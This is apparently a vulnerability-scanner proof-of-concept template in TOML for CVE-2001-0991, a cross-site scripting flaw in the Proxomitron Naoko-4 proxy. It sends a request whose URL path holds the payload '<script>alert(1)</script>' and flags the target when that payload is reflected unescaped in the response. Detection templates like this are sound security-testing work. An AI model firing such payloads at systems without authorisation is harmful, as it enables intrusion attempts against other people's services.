[info]
author = "ave"
description = "通过向 Proxomitron Naoko-4 代理服务器发送包含 XSS 载荷的畸形 URL，检测是否存在跨站脚本漏洞"
id = "POC-AVE-2001-0435"
name = "Proxomitron Naoko-4 Cross-Site Scripting PoC"
severity = "high"
tags = ["ave-2001-0435"]
vuln_id = [
    "CVE-2001-0991",
    "AVE-2001-0435",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert(1)</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
